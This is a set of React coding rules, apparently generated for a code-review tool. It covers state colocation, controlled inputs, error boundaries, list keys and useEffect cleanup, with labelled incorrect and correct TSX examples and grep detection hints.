## Colocate State with the Components That Use It

**Impact: MEDIUM (reduces unnecessary re-renders and simplifies component responsibilities)**

A common anti-pattern is lifting all state to the nearest common ancestor "just in case" or out of habit. When state lives higher in the tree than it needs to, every update to that state re-renders the parent and all of its children — even siblings that have nothing to do with that state. This also clutters the parent component with state management logic it shouldn't own. State should be colocated with the component (or subtree) that actually reads and writes it.

**Incorrect (state lifted too high — search input state in a page-level component):**

```tsx
// ❌ SearchPage owns the search query state, causing the entire page
// (header, sidebar, footer) to re-render on every keystroke
function SearchPage() {
  const [query, setQuery] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('all')
  const [sortOrder, setSortOrder] = useState<'asc' | 'desc'>('desc')
  const results = useSearchResults(query, selectedCategory, sortOrder)

  return (
    <div>
      <Header />  {/* ❌ Re-renders on every keystroke */}
      <Sidebar />  {/* ❌ Re-renders on every keystroke */}
      <SearchBar value={query} onChange={setQuery} />
      <FilterBar
        category={selectedCategory}
        onCategoryChange={setSelectedCategory}
        sortOrder={sortOrder}
        onSortChange={setSortOrder}
      />
      <ResultsList results={results} />
      <Footer />  {/* ❌ Re-renders on every keystroke */}
    </div>
  )
}
```

**Correct (colocate state with the subtree that uses it):**

```tsx
// ✅ SearchPage is a thin layout shell — no unnecessary state
function SearchPage() {
  return (
    <div>
      <Header />
      <Sidebar />
      <SearchSection />  {/* All search state lives here */}
      <Footer />
    </div>
  )
}

// ✅ State is colocated — only this subtree re-renders on changes
function SearchSection() {
  const [query, setQuery] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('all')
  const [sortOrder, setSortOrder] = useState<'asc' | 'desc'>('desc')
  const results = useSearchResults(query, selectedCategory, sortOrder)

  return (
    <section>
      <SearchBar value={query} onChange={setQuery} />
      <FilterBar
        category={selectedCategory}
        onCategoryChange={setSelectedCategory}
        sortOrder={sortOrder}
        onSortChange={setSortOrder}
      />
      <ResultsList results={results} />
    </section>
  )
}
```

**Additional context:**

- The principle: "push state down" as far as possible. Only lift state when two sibling components genuinely need to share it.
- This is the inverse of prop drilling. Prop drilling means state is too high; state colocation is the fix.
- Form input state (search bars, individual form fields) is the most common offender. Each input's state should live in or near that input component, not at the page level.
- If a parent truly needs to react to a child's state (e.g., to show a count of results in the header), consider lifting only that derived value or using a callback rather than the full state.
- React DevTools Profiler can highlight which components re-render. If siblings re-render on unrelated state changes, state is likely too high.

**Detection hints:**

```bash
# Find components with many useState calls — potential over-lifting
grep -rn "useState" src/ --include="*.tsx" --include="*.ts"
```

Reference: [React docs on choosing the state structure](https://react.dev/learn/choosing-the-state-structure)

---

## Do Not Mix Controlled and Uncontrolled Input Patterns

**Impact: MEDIUM (prevents form input bugs and React reconciliation warnings)**

A controlled input has its value managed by React state (`value` + `onChange`). An uncontrolled input manages its own value internally (`defaultValue` or no value prop, read via `ref`). Mixing these patterns on the same input — passing `value` that can be `undefined`, switching between `value` and `defaultValue`, or setting `value` without `onChange` — causes React to warn and the input to behave unpredictably: it may become read-only, ignore user typing, or jump between controlled and uncontrolled modes.

**Incorrect (mixing controlled and uncontrolled patterns):**

```tsx
// ❌ value can be undefined when user is null, switching modes
function ProfileForm({ user }: { user: User | null }) {
  const [name, setName] = useState(user?.name)

  // When user is null, value is undefined → uncontrolled
  // When user loads, value becomes a string → controlled
  return (
    <input
      value={name}  // ❌ undefined on first render = uncontrolled
      onChange={(e) => setName(e.target.value)}
    />
  )
}

// ❌ Both value and defaultValue on the same input
function SearchBox() {
  const [query, setQuery] = useState('')
  return (
    <input
      defaultValue="search..."  // ❌ Ignored when value is also present
      value={query}
      onChange={(e) => setQuery(e.target.value)}
    />
  )
}

// ❌ Controlled value without onChange — input is read-only
function DisplayName({ name }: { name: string }) {
  return <input value={name} />  // ❌ Cannot type — no onChange handler
}
```

**Correct (pick one pattern and use it consistently):**

```tsx
// ✅ Controlled: value is always a string, never undefined
function ProfileForm({ user }: { user: User | null }) {
  const [name, setName] = useState(user?.name ?? '')

  return (
    <input
      value={name}  // ✅ Always a string
      onChange={(e) => setName(e.target.value)}
    />
  )
}

// ✅ Controlled with placeholder (not defaultValue)
function SearchBox() {
  const [query, setQuery] = useState('')
  return (
    <input
      placeholder="Search..."  // ✅ Use placeholder, not defaultValue
      value={query}
      onChange={(e) => setQuery(e.target.value)}
    />
  )
}

// ✅ Uncontrolled with ref (when you don't need to track every keystroke)
function CommentForm({ onSubmit }: { onSubmit: (text: string) => void }) {
  const inputRef = useRef<HTMLInputElement>(null)

  const handleSubmit = () => {
    if (inputRef.current) {
      onSubmit(inputRef.current.value)
      inputRef.current.value = ''
    }
  }

  return (
    <form onSubmit={(e) => { e.preventDefault(); handleSubmit() }}>
      <input ref={inputRef} defaultValue="" />  {/* ✅ Consistently uncontrolled */}
      <button type="submit">Post</button>
    </form>
  )
}

// ✅ Read-only controlled input — use readOnly prop
function DisplayName({ name }: { name: string }) {
  return <input value={name} readOnly />  // ✅ Explicitly read-only
}
```

**Additional context:**

- **Controlled** inputs are preferred when you need to: validate on every keystroke, conditionally prevent input, transform the value (e.g., uppercase), or synchronize with other UI elements.
- **Uncontrolled** inputs (with `useRef`) are appropriate for: simple forms where you only need the value on submit, file inputs (`<input type="file">` is always uncontrolled), and integration with non-React libraries.
- The key rule: if you pass `value`, always pass `onChange` (or `readOnly`/`disabled`). If you use `defaultValue`, never also pass `value`.
- React Hook Form and other form libraries manage this correctly by default — using `register()` with uncontrolled inputs or `Controller` for controlled ones.

**Detection hints:**

```bash
# Find inputs that might mix controlled and uncontrolled
grep -rn "defaultValue.*value=\|value=.*defaultValue" src/ --include="*.tsx" --include="*.jsx"
# Find value prop without onChange
grep -rn "value={" src/ --include="*.tsx" --include="*.jsx"
```

Reference: [React docs on controlled vs uncontrolled components](https://react.dev/learn/sharing-state-between-components#controlled-and-uncontrolled-components)

---

## Add Error Boundaries Around Unreliable UI Sections

**Impact: MEDIUM (prevents full-app crashes from isolated component errors)**

When a React component throws during rendering, React unmounts the entire component tree by default — the user sees a blank white screen. Error boundaries catch rendering errors in their child tree and display a fallback UI instead, keeping the rest of the application functional. Without them, a bug in a single widget, chart, or third-party embed takes down the entire page.

**Incorrect (no error boundaries — one crash kills the whole app):**

```tsx
// ❌ If AnalyticsChart throws (bad data, third-party lib error),
// the entire app goes white
function Dashboard() {
  return (
    <div>
      <Header />
      <Sidebar />
      <AnalyticsChart data={data} />  {/* crash here = blank page */}
      <RecentActivity />
      <Footer />
    </div>
  )
}
```

**Correct (error boundaries isolate failures):**

```tsx
// ✅ Reusable error boundary component (class component — required by React API)
class ErrorBoundary extends React.Component<
  { fallback: ReactNode; children: ReactNode },
  { hasError: boolean }
> {
  state = { hasError: false }

  static getDerivedStateFromError() {
    return { hasError: true }
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    // Log to error reporting service
    reportError(error, info.componentStack)
  }

  render() {
    if (this.state.hasError) {
      return this.props.fallback
    }
    return this.props.children
  }
}

// ✅ Wrap unreliable sections — rest of the app keeps working
function Dashboard() {
  return (
    <div>
      <Header />
      <Sidebar />
      <ErrorBoundary fallback={<p>Chart failed to load.</p>}>
        <AnalyticsChart data={data} />
      </ErrorBoundary>
      <ErrorBoundary fallback={<p>Activity feed unavailable.</p>}>
        <RecentActivity />
      </ErrorBoundary>
      <Footer />
    </div>
  )
}
```

**With react-error-boundary (popular library with hooks API):**

```tsx
import { ErrorBoundary } from 'react-error-boundary'

function Dashboard() {
  return (
    <div>
      <Header />
      <ErrorBoundary
        fallbackRender={({ error, resetErrorBoundary }) => (
          <div role="alert">
            <p>Something went wrong: {error.message}</p>
            <button onClick={resetErrorBoundary}>Try again</button>
          </div>
        )}
        onError={(error, info) => reportError(error, info)}
      >
        <AnalyticsChart data={data} />
      </ErrorBoundary>
      <Footer />
    </div>
  )
}
```

**Additional context:**

- Error boundaries only catch errors during rendering, lifecycle methods, and constructors of child components. They do not catch errors in event handlers, async code, or the error boundary itself. Use `try/catch` for those.
- Place error boundaries at strategic points: around each independent feature section, around third-party components, and at the app root as a last resort.
- Always log caught errors to an error reporting service (Sentry, Datadog, etc.) in `componentDidCatch` or `onError`.
- The `react-error-boundary` package provides `useErrorBoundary()` hook for triggering error boundaries from event handlers and async code.

**Detection hints:**

```bash
# Check if any error boundaries exist in the project
grep -rn "componentDidCatch\|ErrorBoundary\|getDerivedStateFromError" src/ --include="*.tsx" --include="*.ts"
```

Reference: [React docs on error boundaries](https://react.dev/reference/react/Component#catching-rendering-errors-with-an-error-boundary)

---

## Never Use Array Index as Key for Dynamic Lists

**Impact: MEDIUM (prevents state corruption and incorrect UI rendering in dynamic lists)**

React uses the `key` prop to track which items in a list have changed, been added, or been removed during reconciliation. When you use the array index as the key and the list can be reordered, filtered, sorted, or have items inserted/removed, React associates component state (input values, focus, animation state, selection) with the wrong items. This causes inputs to show stale values, animations to play on the wrong elements, and checkboxes to appear checked/unchecked incorrectly.

**Incorrect (array index as key in a dynamic list):**

```tsx
function TodoList({ todos, onRemove }: TodoListProps) {
  return (
    <ul>
      {todos.map((todo, index) => (
        // ❌ When a todo is removed from the middle, all subsequent items
        // shift indices — React reuses the wrong DOM nodes and state
        <li key={index}>
          <input
            type="checkbox"
            checked={todo.done}
            onChange={() => toggleTodo(todo.id)}
          />
          {/* If todo at index 2 is removed, index 3 becomes index 2,
              and its checkbox state comes from the old index 2 */}
          <input defaultValue={todo.text} />
          <button onClick={() => onRemove(todo.id)}>Remove</button>
        </li>
      ))}
    </ul>
  )
}
```

**Correct (use a stable, unique identifier as key):**

```tsx
function TodoList({ todos, onRemove }: TodoListProps) {
  return (
    <ul>
      {todos.map((todo) => (
        // ✅ Stable unique ID — React correctly tracks each item
        // through reorders, insertions, and deletions
        <li key={todo.id}>
          <input
            type="checkbox"
            checked={todo.done}
            onChange={() => toggleTodo(todo.id)}
          />
          <input defaultValue={todo.text} />
          <button onClick={() => onRemove(todo.id)}>Remove</button>
        </li>
      ))}
    </ul>
  )
}
```

**Additional context:**

- Array index as key is acceptable **only** when all three conditions are met: (1) the list is static and never reordered, (2) items are never inserted or removed from the middle, and (3) items have no local state or uncontrolled inputs.
- Good key sources: database IDs, UUIDs, unique slugs, or any value that is stable and unique within the list.
- If items lack a natural unique ID, generate one when the item is created (e.g., `crypto.randomUUID()`) and store it with the item — do not generate it during render.
- The React DevTools "Highlight updates" feature can help visualize when incorrect keys cause unexpected re-renders.

**Detection hints:**

```bash
# Find index used as key prop
grep -rn "key={index}\|key={i}\|key={idx}" src/ --include="*.tsx" --include="*.jsx"
```

Reference: [React docs on why keys matter](https://react.dev/learn/rendering-lists#why-does-react-need-keys)

---

## Always Clean Up useEffect Side Effects

**Impact: MEDIUM (prevents memory leaks and state-update-on-unmounted-component bugs)**

`useEffect` runs side effects after render. When those side effects create persistent resources — event listeners, `setInterval` timers, WebSocket connections, Intersection/Mutation/Resize observers, or in-flight fetch requests — they must be cleaned up when the component unmounts or the effect re-runs. Without cleanup, listeners accumulate (one per render), timers keep firing after navigation, and state updates target unmounted components.

**Incorrect (no cleanup — leaks on every re-render and unmount):**

```tsx
function LivePrice({ symbol }: { symbol: string }) {
  const [price, setPrice] = useState<number | null>(null)

  useEffect(() => {
    // ❌ WebSocket never closed — new connection on every symbol change
    const ws = new WebSocket(`wss://prices.example.com/${symbol}`)
    ws.onmessage = (event) => setPrice(JSON.parse(event.data).price)
  }, [symbol])

  useEffect(() => {
    // ❌ Listener never removed — accumulates on every render
    const handleResize = () => console.log(window.innerWidth)
    window.addEventListener('resize', handleResize)
  }, [])

  useEffect(() => {
    // ❌ Interval never cleared — keeps running after unmount
    const id = setInterval(() => {
      fetch(`/api/prices/${symbol}`).then(r => r.json()).then(d => setPrice(d.price))
    }, 5000)
  }, [symbol])

  return <div>{price}</div>
}
```

**Correct (cleanup function returned from every effect with resources):**

```tsx
function LivePrice({ symbol }: { symbol: string }) {
  const [price, setPrice] = useState<number | null>(null)

  useEffect(() => {
    const ws = new WebSocket(`wss://prices.example.com/${symbol}`)
    ws.onmessage = (event) => setPrice(JSON.parse(event.data).price)

    // ✅ Close WebSocket when symbol changes or component unmounts
    return () => ws.close()
  }, [symbol])

  useEffect(() => {
    const handleResize = () => console.log(window.innerWidth)
    window.addEventListener('resize', handleResize)

    // ✅ Remove listener on unmount
    return () => window.removeEventListener('resize', handleResize)
  }, [])

  useEffect(() => {
    const controller = new AbortController()
    const id = setInterval(() => {
      fetch(`/api/prices/${symbol}`, { signal: controller.signal })
        .then((r) => r.json())
        .then((d) => setPrice(d.price))
        .catch((err) => {
          if (err.name !== 'AbortError') console.error(err)
        })
    }, 5000)

    // ✅ Clear interval and abort in-flight request
    return () => {
      clearInterval(id)
      controller.abort()
    }
  }, [symbol])

  return <div>{price}</div>
}
```

**Additional context:**

- **Rule of thumb:** If your effect creates something (listener, timer, connection, observer), return a function that destroys it.
- Common cleanup targets: `removeEventListener`, `clearInterval`, `clearTimeout`, `AbortController.abort()`, `observer.disconnect()`, `subscription.unsubscribe()`, `WebSocket.close()`.
- In React Strict Mode (development), effects run twice to help surface missing cleanup. If you see "double subscription" issues in dev, it means cleanup is missing.
- For fetch requests, use `AbortController` to cancel in-flight requests when dependencies change. This prevents race conditions where a slow response from the old request overwrites a fast response from the new one.

**Detection hints:**

```bash
# Find useEffect without return statement (potential missing cleanup)
grep -rn "useEffect" src/ --include="*.tsx" --include="*.ts"
# Find addEventListener without corresponding removeEventListener
grep -rn "addEventListener" src/ --include="*.tsx" --include="*.ts"
# Find setInterval without clearInterval
grep -rn "setInterval" src/ --include="*.tsx" --include="*.ts"
```

Reference: [React docs on synchronizing with effects](https://react.dev/learn/synchronizing-with-effects#how-to-handle-the-effect-firing-twice-in-development)

---

*Generated by BeforeMerge build script on 2026-03-04.*
*Version: 0.1.0 | Rules: 16*